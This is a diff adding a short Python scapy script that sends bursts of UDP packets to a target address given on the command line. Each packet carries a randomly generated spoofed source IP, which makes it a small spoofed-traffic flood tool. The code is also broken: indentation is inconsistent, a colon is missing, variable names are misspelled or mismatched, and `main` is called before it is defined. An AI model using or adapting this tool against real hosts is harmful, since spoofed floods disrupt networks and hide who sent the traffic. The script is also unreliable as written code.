@@ -1,0 +1,40 @@
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+from scapy.all import sendp, IP, UDP, Ether, TCP
+
+
+if __name__=="__main__":
+  main()
+
+def main():
+  
+  for i in range (1,5):
+ 	import sys
+        import time
+  	from os import popen
+	destIP = sys.argv[1:]
+  	print dstIP
+  	src_port = 80
+  	dest_port = 1
+  	intface = popen('ifconfig | awk \'/eth0/ {print $1}\'').read()
+	
+	for i in range(0,250):
+    		pckts = Ether()/IP(dst=destIP,src=srcIP())/UDP(dport=dest_port,sport=src_port)
+    		print(repr(pckts)) 
+    		sendp( pckts,iface=intface.rstrip(),inter=0.03)
+
+	time.sleep (10)
+
+def srcIP()
+   
+  from random import randrange
+
+  first_octet = randrange(1,256)
+
+
+  while first_octect in [1,2,10,127,169,172,192,254,255]:
+   	 first_octet = randrange(1,256)
+   	 print first_octet
+  
+  ip = ".".join([str(first_octet),str(randrange(1,256)), str(randrange(1,256)),str(randrange(1,256))])
+  print ip
+  return ip
